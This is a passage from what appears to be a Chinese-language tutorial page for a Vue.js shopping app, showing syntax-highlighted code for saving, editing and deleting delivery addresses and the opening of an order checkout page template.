#D4D4D4">          },</span></span><span class="line"><span style="color: #D4D4D4">          {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">value:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">nameToCode</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">county</span><span style="color: #D4D4D4">)) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">label:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">county</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          },</span></span><span class="line"><span style="color: #D4D4D4">        ];</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 封装数据对象</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">dataObj</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">phone:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">tel</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">region:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">region</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">detail:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressDetail</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        };</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 调用接口进行地址的保存</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"保存成功"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">replace</span><span style="color: #D4D4D4">({ </span><span style="color: #9CDCFE">path:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"/address/manage"</span><span style="color: #D4D4D4"> }); </span><span style="color: #6A9955">// 保存成功后返回地址列表页面</span></span><span class="line"><span style="color: #D4D4D4">      } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 编辑地址</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// console.log('编辑地址的content:', content)</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 封装对象，用于发送请求</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">dataObj</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">address_id:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">form:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">phone:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">tel</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">region:</span><span style="color: #D4D4D4"> [</span></span><span class="line"><span style="color: #D4D4D4">              {</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #9CDCFE">label:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">province</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #9CDCFE">value:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">nameToCode</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">province</span><span style="color: #D4D4D4">)) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">              },</span></span><span class="line"><span style="color: #D4D4D4">              {</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #9CDCFE">label:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">city</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #9CDCFE">value:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">nameToCode</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">city</span><span style="color: #D4D4D4">)) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">              },</span></span><span class="line"><span style="color: #D4D4D4">              {</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #9CDCFE">label:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">county</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #9CDCFE">value:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">nameToCode</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">county</span><span style="color: #D4D4D4">)) || </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">              },</span></span><span class="line"><span style="color: #D4D4D4">            ],</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">detail:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressDetail</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          },</span></span><span class="line"><span style="color: #D4D4D4">        };</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// console.log('dataObj:', dataObj)</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">updateAddress</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">dataObj</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"保存成功"</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 处理默认地址的标识问题</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">checkDefault</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// 为真说明当前编辑的是默认地址</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"当前是默认地址，content:"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"当前是默认地址，this.adressInfo:"</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isDefault</span><span style="color: #D4D4D4"> !== </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">checkDefault</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #6A9955">// 说明用户取消了这个默认地址，需要将Vuex的默认地址id赋值为-1</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Address/setDefaultAddressId"</span><span style="color: #D4D4D4">, -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          }</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// 否则什么也不做</span></span><span class="line"><span style="color: #D4D4D4">        } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// 说明当前编辑的不是默认地址</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"当前不是默认地址，content:"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"当前不是默认地址，this.adressInfo:"</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">content</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isDefault</span><span style="color: #D4D4D4"> !== </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">checkDefault</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #6A9955">// 说明用户将当前不是默认地址的地址设置为默认地址</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #CE9178">"Address/setDefaultAddressId"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span></span><span class="line"><span style="color: #D4D4D4">            );</span></span><span class="line"><span style="color: #D4D4D4">          }</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// 否则什么也不做</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 处理完成后跳转会地址列表页</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">replace</span><span style="color: #D4D4D4">({ </span><span style="color: #9CDCFE">path:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"/address/manage"</span><span style="color: #D4D4D4"> });</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">onDelete</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 判断是否删除的是默认地址，如果是，则将Vuex的默认地址id赋值为-1</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">checkDefault</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">commit</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Address/setDefaultAddressId"</span><span style="color: #D4D4D4">, -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #CE9178">"删除默认地址, Vuex的默认地址id:"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">state</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">Address</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">defaultAddressId</span></span><span class="line"><span style="color: #D4D4D4">        );</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$store</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">dispatch</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Address/deleteAddress"</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">Toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"删除成功"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">setTimeout</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">replace</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/address/manage"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      }, </span><span style="color: #B5CEA8">1000</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 设置默认地址</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">onChangeDefault</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">val</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log(val)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 只有编辑才可以设置默认地址</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isDefault</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">val</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #CE9178">"设置默认地址的按钮被触发, this.addressInfo.isDefault:"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">isDefault</span></span><span class="line"><span style="color: #D4D4D4">      );</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.address-list</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">60px</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 增加与导航栏等高的内边距，避免内容被导航栏覆盖 */</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.address-edit</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 给地址编辑区域增加一些内边距，使内容不贴边 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 设置背景色为白色 */</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>导入 vant 组件略过。</p><h2 id="订单结算台"><a class="markdownIt-Anchor" href="#订单结算台"></a> 订单结算台</h2><h3 id="静态结构-2"><a class="markdownIt-Anchor" href="#静态结构-2"></a> 静态结构</h3><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">fixed</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"订单结算台"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">left-arrow</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 地址相关 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: 